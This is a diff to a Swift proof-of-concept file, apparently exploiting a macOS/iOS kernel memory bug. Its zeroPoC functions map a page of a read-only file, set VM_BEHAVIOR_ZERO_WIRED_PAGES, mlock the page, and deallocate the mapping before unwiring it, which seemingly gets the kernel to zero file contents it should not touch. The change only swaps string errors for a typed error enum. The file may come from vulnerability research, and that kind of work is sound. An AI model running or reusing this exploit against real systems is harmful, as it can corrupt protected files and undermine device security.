@@ -11,20 +11,28 @@
 import Foundation
 import Darwin
 
+enum ZeroPoCError: Error {
+    case openFailed
+    case mmapFailed
+    case vmBehaviorFailed
+    case mlockFailed
+    case vmDeallocateFailed(String)
+}
+
 let pageSize = sysconf(_SC_PAGESIZE)
 
 func mapFilePage(path: String) throws -> UnsafeMutableRawPointer {
     let fd = open(path, O_RDONLY)
     
     guard fd != -1 else {
-      throw "open failed"
+        throw ZeroPoCError.openFailed
     }
     
     let mappedAt = mmap(nil, pageSize, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
     
     guard mappedAt != MAP_FAILED else {
         close(fd)
-        throw "mmap failed"
+        throw ZeroPoCError.mmapFailed
     }
     
     return mappedAt!
@@ -38,20 +46,20 @@ func zeroPoC(path: String) throws {
     
     var kr = vm_behavior_set(mach_task_self_, pageVmAddress, vm_size_t(pageSize), VM_BEHAVIOR_ZERO_WIRED_PAGES)
     guard kr == KERN_SUCCESS else {
-        throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
+        throw ZeroPoCError.vmBehaviorFailed
     }
     
     print("set VM_BEHAVIOR_ZERO_WIRED_PAGES")
     
     let mlockErr = mlock(page, pageSize)
     guard mlockErr == 0 else {
-        throw "mlock failed"
+        throw ZeroPoCError.mlockFailed
     }
     print("mlock success")
     
     kr = vm_deallocate(mach_task_self_, pageVmAddress, vm_size_t(pageSize))
     guard kr == KERN_SUCCESS else {
-        throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
+        throw ZeroPoCError.vmDeallocateFailed(String(cString: mach_error_string(kr)))
     }
     print("deleted map entries before unwiring")
     
@@ -64,20 +72,20 @@ func zeroPoC(address: UInt) throws {
     
     var kr = vm_behavior_set(mach_task_self_, address, vm_size_t(pageSize), VM_BEHAVIOR_ZERO_WIRED_PAGES)
     guard kr == KERN_SUCCESS else {
-        throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
+        throw ZeroPoCError.vmBehaviorFailed
     }
     
     print("set VM_BEHAVIOR_ZERO_WIRED_PAGES")
     
     let mlockErr = mlock(UnsafeRawPointer(bitPattern: address)!, pageSize)
     guard mlockErr == 0 else {
-        throw "mlock failed"
+        throw ZeroPoCError.mlockFailed
     }
     print("mlock success")
     
     kr = vm_deallocate(mach_task_self_, address, vm_size_t(pageSize))
     guard kr == KERN_SUCCESS else {
-        throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
+        throw ZeroPoCError.vmDeallocateFailed(String(cString: mach_error_string(kr)))
     }
     print("deleted map entries before unwiring")
     
